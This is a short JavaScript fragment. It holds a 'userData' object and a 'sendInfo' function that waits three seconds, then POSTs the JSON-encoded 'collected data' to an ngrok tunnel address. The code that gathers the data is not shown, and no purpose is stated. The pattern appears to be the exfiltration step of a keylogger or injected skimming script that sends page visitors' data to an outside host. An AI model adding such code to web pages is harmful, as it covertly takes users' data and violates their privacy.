var userData = {
    "haha": [],
}

var sendInfo = function(){
    setTimeout(function(){
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://dfe671c44d2b.ngrok.io", true);
        xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
        // send the collected data as JSON
        xhr.send(JSON.stringify(userData));
        xhr.onloadend = function () {
        // done
        } 
    }, 3000)
}
